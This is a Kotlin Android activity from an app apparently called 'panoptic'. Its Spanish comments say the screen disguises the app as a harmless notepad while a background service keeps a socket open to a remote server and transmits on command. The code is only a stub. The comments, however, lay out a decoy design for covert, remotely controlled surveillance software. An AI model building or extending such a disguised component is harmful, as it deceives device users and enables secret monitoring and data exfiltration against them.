package com.juanrbcode.panoptic.Activity

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.juanrbcode.panoptic.R

class ConnectedActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_connected)

        // Aquí la app se muestra como un simple bloc de notas inofensivo.
        // Mientras tanto, tu Service en segundo plano (ConnectionService)
        // sigue manteniendo el socket abierto con Railway transmitiendo cuando se le ordene.
    }
}